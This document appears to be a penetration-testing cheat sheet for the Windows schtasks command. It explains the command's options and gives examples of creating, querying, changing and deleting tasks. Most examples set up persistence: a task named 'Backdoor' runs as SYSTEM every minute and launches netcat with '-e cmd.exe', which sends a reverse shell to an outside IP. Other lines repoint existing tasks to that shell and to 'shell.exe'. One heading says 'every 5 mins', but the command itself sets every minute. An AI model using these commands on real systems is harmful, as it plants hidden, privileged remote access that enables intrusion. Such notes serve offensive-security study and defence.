## Task Schedule

### Options

```powershell
# Options
/CREATE # specifies that you want to create a new an automated routine.
/SC # defines the schedule for the task. Options available, include MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, and ONEVENT.
/D # specifies the day of the week to execute the task. Options available, include MON, TUE, WED, THU, FRI, SAT, and SUN. If you're using the MONTHLY option, then you can use 1 - 31 for the days of the month. Also, there's the wildcard "*" that specifies all days.
/TN # specifies the task name and location. The "MyTasks\Notepad task" uses the "Notepad task" as the name and stores the task in the "MyTasks" folder. If the folder isn't available, it'll be created automatically.
/MO # Modifier, used for finer tune control of timing
/TR # specifies the location and the name of the task that you want to run. You can select an app or custom script.
/ST # defines the time to run the task (in 24 hours format).
/QUERY # displays all the system tasks.
/RU # specifies the task to run under a specific user account.
```

Create a scheduled task to run daily at 11:00 as admin

```powershell
SCHTASKS /CREATE /SC DAILY /TN "MyTasks\Notepad task" /TR "C:\Windows\System32\notepad.exe" /ST 11:00 /RU admin
```

Create a scheduled task to run every 5 mins as SYSTEM

```powershell
SCHTASKS /CREATE /TN "Backdoor" /SC MINUTE /MO 1 /tr "c:\coyote\nc.exe -nv 192.168.119.216 8010 -e cmd.exe" /RU "SYSTEM"
```

Show a task:

```powershell
schtasks /query /fo LIST /v /TN "Backdoor"

schtasks /query /fo LIST /v /TN "backup_perl"

schtasks /query
```

Modify an existing task:

```bash
schtasks /change /tr "c:\coyote\nc.exe -nv 192.168.119.216 8010 -e cmd.exe" /TN "Backdoor"

schtasks /change /tr "shell.exe" /TN "Cleanup"

# Uses the same options as when creating task, just specify the option and the value to change to.  Note that some options cannot be changed, just delete it and recreate it then.
```

Delete a task:

```powershell
schtasks /delete /f /tn "Backdoor"
```

